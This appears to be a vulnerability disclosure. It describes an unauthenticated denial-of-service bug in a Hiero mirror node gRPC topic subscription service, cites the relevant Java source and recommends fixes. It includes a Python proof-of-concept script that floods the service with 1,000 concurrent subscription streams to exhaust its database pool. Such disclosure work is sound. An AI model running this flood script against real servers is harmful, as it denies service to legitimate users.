### Title
Unbounded Concurrent Subscriptions via Multiple Connections Enable Database Exhaustion DoS

### Summary
The `retrieve()` method in `PollingTopicMessageRetriever` and the `subscribeTopic()` entry point in `TopicMessageServiceImpl` impose no per-client or per-IP ceiling on concurrent subscriptions. The only guard — `maxConcurrentCallsPerConnection = 5` — is scoped to a single TCP connection and is trivially bypassed by opening additional connections. An unauthenticated attacker can therefore drive an unbounded number of independent DB-polling loops, exhausting the shared database connection pool and denying service to legitimate users.

### Finding Description

**Entry point** — `ConsensusController.subscribeTopic()` accepts any unauthenticated gRPC stream and immediately delegates to `TopicMessageServiceImpl.subscribeTopic()` with no admission check. [1](#0-0) 

**Service layer** — `TopicMessageServiceImpl.subscribeTopic()` maintains a global `AtomicLong subscriberCount` that is wired only to a Micrometer `Gauge` for observability. It is never compared against a maximum; there is no guard that rejects a new subscription when the count is too high. [2](#0-1) [3](#0-2) 

**Retriever** — Every accepted subscription calls `topicMessageRetriever.retrieve(filter, true)`, which in `PollingTopicMessageRetriever.retrieve()` creates a brand-new `PollingContext` and starts an independent `Flux` that issues a `SELECT` against the database on every tick (default: every 2 s when throttled, every 20 ms when unthrottled). There is no shared pool or deduplication of identical topic queries across subscribers. [4](#0-3) [5](#0-4) 

**The only existing guard** — `NettyProperties.maxConcurrentCallsPerConnection` defaults to 5 and is applied in `GrpcConfiguration` via `serverBuilder.maxConcurrentCallsPerConnection(...)`. This is a per-TCP-connection limit enforced by Netty/gRPC; it does not restrict how many connections a single IP may open. [6](#0-5) [7](#0-6) 

**Why the guard fails** — An attacker opens *M* TCP connections. Each connection carries 5 concurrent `subscribeTopic` streams. The server accepts all M × 5 streams, spawning M × 5 independent polling loops. With M = 200 connections the attacker runs 1 000 simultaneous DB queries every 2 seconds (or every 20 ms in the unthrottled path), with no authentication or identity check required.

### Impact Explanation
Each polling loop executes `topicMessageRepository.findByFilter()` against the shared PostgreSQL connection pool. Saturating the pool causes all subsequent queries — including those from legitimate subscribers and the importer — to queue or time out. The `statementTimeout` of 10 000 ms means each blocked query holds a pool slot for up to 10 s, compounding the exhaustion. The result is a full denial of service for the gRPC API and degraded performance for the REST API that shares the same database.

### Likelihood Explanation
No authentication is required; the gRPC port (default 5600) is publicly reachable. Opening hundreds of TCP connections and issuing `subscribeTopic` RPCs is achievable with a single script using any gRPC client library. The attack is repeatable, requires no special knowledge beyond the public protobuf schema, and can be sustained indefinitely because each stream is long-lived.

### Recommendation
1. **Enforce a global subscription ceiling**: compare `subscriberCount` against a configurable `maxSubscribers` property before accepting a new subscription in `TopicMessageServiceImpl.subscribeTopic()`, returning `RESOURCE_EXHAUSTED` when the limit is exceeded.
2. **Add a per-source-IP connection limit** at the Netty layer (e.g., via a `ServerTransportFilter` or an external load-balancer rule) so that a single client cannot open an unbounded number of TCP connections.
3. **Deduplicate retriever instances per topic**: use a shared `Flux` (e.g., `publish().refCount()`) for subscriptions to the same topic so that N subscribers to the same topicId share one DB polling loop rather than issuing N independent queries.
4. **Apply token-bucket rate limiting** at the `ConsensusController` entry point keyed on the remote peer address.

### Proof of Concept
```python
import grpc, threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-host:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1   # any existing topic
CONNECTIONS = 200   # each allows 5 concurrent calls → 1 000 polling loops

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(
            shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM))
    threads = []
    for _ in range(5):          # 5 streams per connection
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(req)))
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for w in workers:
    w.start()
# Result: 1 000 concurrent DB polling loops; DB pool exhausted within seconds.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-48)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L87-91)
```java
        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L45-63)
```java
    public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
        if (!retrieverProperties.isEnabled()) {
            return Flux.empty();
        }

        PollingContext context = new PollingContext(filter, throttled);
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L65-79)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L31-34)
```java
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```
